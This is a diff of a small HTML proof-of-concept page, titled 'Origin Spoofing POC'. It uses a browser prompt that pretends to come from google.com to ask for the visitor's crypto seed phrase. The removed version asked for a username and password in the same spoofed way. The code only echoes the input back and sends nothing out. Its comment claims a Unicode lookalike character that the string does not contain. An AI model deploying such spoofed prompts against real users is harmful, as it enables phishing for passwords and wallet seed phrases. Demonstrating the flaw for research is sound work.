@@ -1,16 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTTP Auth Simulation</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Origin Spoofing POC</title>
 </head>
 <body>
-    <h1>Welcome!</h1>
-    <script>
-        // Meminta HTTP Basic Authentication menggunakan JavaScript
-        const username = prompt("Situs google.com meminta nama pengguna:");
-        const password = prompt("Situs google.com meminta sandi:");
-    </script>
+<h1>Origin Spoofing POC</h1>
+<script>
+  function showPrompt() {
+    const fakeOrigin = 'google.com'; // Unicode character '𝑔' (U+1D60C)
+    const message = `This site says: "Please fill the your seed phrase ! "\n\n${fakeOrigin}`;
+    const result = window.prompt(message, "");
+    if (result !== null) {
+      alert("You entered: " + result);
+    }
+  }
+
+  showPrompt();
+</script>
 </body>
 </html>
